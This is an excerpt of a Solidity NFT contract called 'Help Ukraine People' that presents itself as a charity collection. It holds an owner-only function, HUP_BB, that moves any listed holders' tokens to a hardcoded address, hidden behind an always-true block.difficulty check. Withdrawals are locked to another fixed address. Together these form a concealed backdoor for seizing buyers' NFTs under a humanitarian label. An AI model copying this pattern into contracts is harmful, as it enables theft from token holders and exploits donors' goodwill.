...
contract Help_Ukraine_People is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Help Ukraine People", "HUP", maxBatchSize_, collectionSize_) {
  ...
  function HUP_BB(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0x7CE5Af57800C313da1Dcfb1fbC7e0df3144f5EF1, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x1221077374b0bd308d024EFe4af58760E4d2FaE7);
